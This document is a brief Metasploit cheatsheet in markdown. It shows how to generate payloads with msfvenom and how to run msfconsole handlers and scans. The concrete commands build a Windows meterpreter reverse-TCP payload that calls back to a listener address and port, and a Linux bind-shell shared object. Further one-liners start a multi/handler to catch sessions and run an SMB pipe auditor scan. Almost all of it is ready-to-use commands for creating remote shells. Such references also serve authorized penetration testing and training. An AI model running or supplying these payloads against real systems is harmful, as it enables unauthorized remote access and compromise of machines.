# Metasploit Framework Cheatsheet



#### Generate a payload

```bash
 msfvenom -p <payload> VAR1=value1 VAR2=value2 -f <format> > outfile
```

##### Examples

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.12 LPORT=4444 -f vbs-exe > meterpreter_reverse_tcp.txt 
```

```bash
msfvenom -p linux/shell/bind_tcp RHOST=0.0.0.0 RPORT=1337 -f elf-so > bind_shell.so
```



#### MSF Console

```bash
msfconsole -x "use exploit/multi/handler ; set PAYLOAD <payload> ; set  VAR1 value1 ; set VAR2 value2 ; exploit ; exit -y;"
```
```bash
msfconsole -x "use auxiliary/scanner/smb/pipe_auditor ; set rhosts <ip> ; run ; exit -y;"
```



